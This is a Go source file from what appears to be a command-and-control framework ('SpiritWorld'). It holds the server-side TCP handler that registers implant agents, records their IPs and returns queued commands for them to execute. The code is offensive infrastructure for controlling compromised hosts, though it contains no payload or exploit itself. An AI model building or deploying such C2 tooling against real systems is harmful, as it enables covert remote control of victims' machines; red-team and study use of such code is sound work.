package tcp

import (
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/agents"
	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/api"
	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/database"
)

func HandleMessage(msg []byte, conn net.Conn) bool {

	var agentBeacon agents.AgentBeacon

	if err := json.Unmarshal(msg, &agentBeacon); err != nil {
		fmt.Println(err)
		return false
	}

	switch agentBeacon.Action.ActionType {
	case "register":
		return agentRegister(&agentBeacon, conn)
	case "beacon":
		return agentBeaconing(&agentBeacon, conn)
	default:
		break
	}

	return true
}

func agentRegister(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {

	register := api.RegisterAgent{
		RegisterTime: time.Now(),
		PublicIP:     conn.RemoteAddr().String(),
		Agent:        agentBeacon.Agent,
	}

	var db database.DatabaseModel
	db.Open()
	defer db.Close()

	if !db.InsertAgent(register) {
		return false
	}

	resp := &agents.Action{
		ActionType:   "register",
		ActionOutput: "success",
	}

	msg, _ := json.Marshal(resp)
	_, err := conn.Write(msg)
	if err != nil {
		return false
	}

	return true
}

func agentBeaconing(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {

	beacon := api.BeaconAgent{
		BeaconTime: time.Now(),
		PublicIP:   conn.RemoteAddr().String(),
		Agent:      agentBeacon.Agent,
	}

	var db database.DatabaseModel
	db.Open()
	defer db.Close()

	if !db.UpdateAgent(beacon) {
		return false
	}

	agent, err := db.GetAgentByID(beacon.Agent.UUID)
	if err != nil {
		return false
	}

	var resp agents.Action
	if len(agent.Beacon.ActionQueue) == 0 {
		resp = *agentBeacon.Action
		resp.ActionOutput = "success"
	} else {
		action, err := db.GetActionByID(agent.Beacon.ActionQueue[0])
		if err != nil {
			return false
		}

		resp.UUID = action.UUID
		resp.ActionType = action.ActionType
		resp.ActionCmd = action.ActionCmd

	}

	msg, _ := json.Marshal(resp)
	_, err = conn.Write(msg)
	if err != nil {
		return false
	}

	return true
}
